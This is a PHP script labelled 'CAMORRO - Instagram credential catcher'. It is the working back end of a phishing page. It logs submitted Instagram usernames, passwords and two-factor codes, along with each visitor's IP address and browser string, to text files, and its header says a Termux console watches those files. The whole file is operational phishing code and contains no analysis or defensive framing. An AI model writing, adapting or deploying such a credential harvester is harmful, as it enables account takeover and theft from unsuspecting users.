<?php
/**
 * CAMORRO - Instagram credential catcher
 * Saves to saved.usernames.txt (Termux console watches this file)
 */
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

$log = __DIR__ . '/saved.usernames.txt';
$ip  = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua  = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$ts  = date('Y-m-d H:i:s');

$raw = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data)) {
    $data = $_POST;
}

$type = isset($data['type']) ? preg_replace('/[^a-z0-9_\-]/i', '', $data['type']) : 'unknown';
$user = isset($data['username']) ? trim((string)$data['username']) : '';
$pass = isset($data['password']) ? (string)$data['password'] : '';
$code = isset($data['code']) ? trim((string)$data['code']) : '';
$attempt = isset($data['attempt']) ? (int)$data['attempt'] : 0;

$line = "";

switch ($type) {
    case 'username':
        $line = "[$ts] [IP:$ip] STEP1-USER | user=$user | ua=$ua\n";
        break;
    case 'password':
        $line = "[$ts] [IP:$ip] STEP2-PASS | user=$user | pass=$pass | ua=$ua\n";
        break;
    case 'login':
        $line = "[$ts] [IP:$ip] LOGIN-SUBMIT | user=$user | pass=$pass | ua=$ua\n";
        break;
    case '2fa':
        $line = "[$ts] [IP:$ip] 2FA-CODE | user=$user | code=$code | attempt=$attempt | ua=$ua\n";
        break;
    case 'resend':
        $line = "[$ts] [IP:$ip] RESEND | user=$user | ua=$ua\n";
        break;
    case 'try_different':
        $line = "[$ts] [IP:$ip] TRY-DIFF | user=$user | ua=$ua\n";
        break;
    default:
        $line = "[$ts] [IP:$ip] RAW | " . str_replace(["\r", "\n"], ' ', $raw) . " | ua=$ua\n";
}

file_put_contents($log, $line, FILE_APPEND | LOCK_EX);

// أيضاً append إلى ملف عام سهل القراءة
file_put_contents(
    __DIR__ . '/credentials.txt',
    $line,
    FILE_APPEND | LOCK_EX
);

echo json_encode(['ok' => true]);
